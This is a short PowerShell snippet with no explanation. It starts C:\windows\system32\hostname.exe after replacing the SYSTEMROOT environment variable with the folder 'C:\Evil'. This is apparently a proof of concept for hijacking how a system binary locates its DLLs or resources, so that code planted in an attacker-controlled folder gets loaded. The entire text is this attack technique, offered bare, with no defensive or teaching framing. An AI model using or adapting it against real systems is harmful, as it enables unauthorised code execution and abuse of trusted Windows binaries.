$s = New-Object System.Diagnostics.ProcessStartInfo
$s.FileName="C:\windows\system32\hostname.exe"
$s.EnvironmentVariables.Remove("SYSTEMROOT")
$s.EnvironmentVariables.Add("SYSTEMROOT", "C:\Evil")
$s.UseShellExecute = $false
$p = New-Object System.Diagnostics.Process
$p.StartInfo = $s
$p.Start()